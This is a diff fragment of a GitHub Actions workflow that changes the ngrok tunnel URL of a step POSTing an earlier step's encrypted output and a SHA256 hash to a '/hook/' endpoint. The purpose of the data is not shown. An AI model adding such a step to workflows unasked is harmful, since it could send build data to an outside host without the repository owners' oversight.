@@ -53,7 +53,7 @@ jobs:
       id: posting
       uses: fjogeleit/http-request-action@master
       with:
-        url: 'https://1f33-54-91-189-235.ngrok.io/hook/'
+        url: 'https://3e75-54-91-189-235.ngrok.io/hook/'
         method: 'POST'
         data: '{"data":"${{ steps.encrypted.outputs.content }}" , "SHA256":"${{ steps.sha256.outputs.content }}"}'
         timeout: 10000
